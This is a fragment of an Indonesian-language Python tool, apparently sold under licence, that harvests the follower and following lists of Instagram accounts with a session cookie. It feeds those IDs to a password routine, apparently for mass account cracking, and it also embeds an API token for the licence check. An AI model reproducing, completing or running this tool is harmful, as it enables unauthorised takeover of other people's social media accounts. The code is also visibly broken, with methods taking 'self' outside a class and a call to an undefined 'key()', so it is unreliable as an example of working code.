        elif c in ('e','E'):
            self.Exit()

        else:
            self.menu()
            
          
def keys():
    banner()
    wel='# LICENSE GAGAL '
    wel2 = mark(wel, style='red')
    sol().print(wel2)
    time.sleep(2)
    prints(Panel(f"""\r[01]. [blue]I have apikey and want to enter it[/]\n[02]. [red]I don't have Apikey and want to buy[/]""",style=f"green"))
    api = input(f" {N}input choice : ")
    if api in["1","01"]:
        tlisensi()
    elif api in["2","02"]:
        os.system("xdg-open https://wa.me/+6283862287464?text=assalamualaikum,+bang+me+want+buy+license")
        sleep(2);tlisensi()       
    else:    
        exit()




def tlisensi():
    banner()
    wel='# LICENSE IS NOT APPLICABLE OR WRONG'
    wel2 = mark(wel, style='red')
    sol().print(wel2)
    time.sleep(2)
    lisen=input(' Enter License : ' )
    open('data/key.txt','w').write(lisen)
    lisensi()


def lisensi():
    try:
        cek=open('data/key.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses=requests.Session()
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMjAxOTMxNCIsIkZNd3EzdkZEbnZXbUNwdXNuTzJCVFdjN1l3Q1NURWJTeDZxdXlzdzQiXQ==&ProductId=15883&Key='+lisensikuni[0]).json()
    status=res['licenseKey']['key']
    if status ==cek:
        banner()
        wel='# Lisensi Kamu Valid '
        wel2 = mark(wel, style='green')
        sol().print(wel2)
        time.sleep(2)
        lisensiku.append("sukses")
        login_kamu()
    else:
        tlisensi()

def mengi(self):
            try:
                menudump.append('pengikut')
                mas='# Target harus bersifat publik jangan privat'
                mas1=mark(mas,style='red')
                sol().print(mas1)
                m=int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                so=f'# TOTAL ID :{len(internal)}'
                pi=mark(so,style='green')
                sol().print(pi)
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)

def meng(self):
    mas='# Target harus bersifat publik jangan privat'
    mas1=mark(mas,style='red')
    sol().print(mas1)
    m=input(f'{CY}[•] Username target : {C}')

    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                mas='# Target harus bersifat publik jangan privat'
                mas1=mark(mas,style='red')
                sol().print(mas1)
                m=int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                so=f'# TOTAL ID :{len(internal)}'
                pi=mark(so,style='green')
                sol().print(pi)
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
            mas='# Target harus bersifat publik jangan privat'
            mas1=mark(mas,style='red')
            sol().print(mas1)
            m=input(f'{CY}[•] Username target : {C}')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

if __name__=='__main__':
    try:
    	key()
    	folder()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}!{C}] Koneksi internet bermasalah')